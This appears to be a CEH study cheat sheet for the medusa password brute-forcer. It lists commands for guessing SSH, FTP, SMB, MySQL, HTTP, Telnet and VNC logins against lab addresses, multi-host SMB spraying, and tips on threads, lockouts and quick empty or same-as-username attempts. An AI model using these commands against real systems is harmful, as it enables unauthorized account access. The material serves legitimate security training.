# medusa — Parallel login brute-forcer

> **Alternative to hydra.** Modular, multi-threaded, speed-focused. Supports SSH, FTP, HTTP, SMB, MySQL, PostgreSQL, RDP, VNC, Telnet, and more. CEH: "brute force SSH on target".

**Install check (Parrot):** `medusa -V` (install: `sudo apt install medusa`).

---

## 🎯 Cheat-flow

| Goal | Command |
|---|---|
| **SSH brute** (single user, wordlist) | `medusa -h 192.168.52.129 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh` |
| SSH (user list + pass list) | `medusa -h 192.168.52.129 -U users.txt -P pass.txt -M ssh -t 4` |
| **FTP brute** | `medusa -h 192.168.52.129 -u anonymous -P pass.txt -M ftp` |
| SMB brute | `medusa -h 192.168.52.130 -u Administrator -P pass.txt -M smbnt` |
| MySQL | `medusa -h 192.168.52.129 -u root -P pass.txt -M mysql` |
| HTTP basic auth | `medusa -h 192.168.52.129 -U users.txt -P pass.txt -M http -m DIR:/admin` |
| PostgreSQL | `medusa -h 192.168.52.129 -u postgres -P pass.txt -M postgres` |
| Telnet | `medusa -h 192.168.52.129 -u msfadmin -P pass.txt -M telnet` |
| VNC | `medusa -h 192.168.52.129 -u "" -P pass.txt -M vnc` |
| Verbose + save | `medusa -h 192.168.52.129 -u msfadmin -P pass.txt -M ssh -v 6 -O found.txt` |

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-h <host>` | Target host |
| `-H <file>` | Host list |
| `-u <user>` | Single username |
| `-U <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-M <module>` | Service module (ssh, ftp, http, smbnt, mysql…) |
| `-m <opts>` | Module-specific options (e.g. `DIR:/admin`) |
| `-t <n>` | Threads per host (default 1) |
| `-T <n>` | Parallel hosts |
| `-f` | Stop on first success |
| `-F` | Stop after first success globally |
| `-n <port>` | Custom port |
| `-O <file>` | Log success to file |
| `-v <0-6>` | Verbosity |
| `-d` | List available modules |
| `-e ns` | Try empty + username-as-password |

---

## ⚡ Common CEH patterns

### List available modules
```bash
medusa -d
```

### SSH brute with threading
```bash
medusa -h 192.168.52.129 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f
```

### Multi-host SMB spray
```bash
medusa -H hosts.txt -u Administrator -P passwords.txt -M smbnt -t 2 -T 5 -F
```

---

## ⚠️ Gotchas

- **Lockouts:** too many threads = account lockout on Win domain/RDP. Keep `-t 1-2` for RDP.
- **SSH rate limits:** default sshd allows ~6 concurrent auth — threads above 4 get rejected silently.
- **`-e ns`** (null + same-as-username) is a quick win — try first before full wordlist.
- Module list may differ by install; always run `medusa -d` to confirm.
- **hydra vs medusa:** similar feature set; hydra has better HTTP form support, medusa claims better parallelism. Try whichever works for the service.

---

## 🧠 medusa vs hydra vs ncrack

| Scenario | Best |
|---|---|
| Web form brute (HTTP POST) | **hydra** (`http-post-form` module) |
| RDP | **ncrack** (purpose-built) |
| SSH at scale | **medusa** or hydra |
| Legacy services (telnet, VNC) | either |

---

## 📖 See also
- [hydra.md](hydra.md)
- [ncrack.md](ncrack.md) *(coming soon)*
- [john.md](john.md) — offline cracking
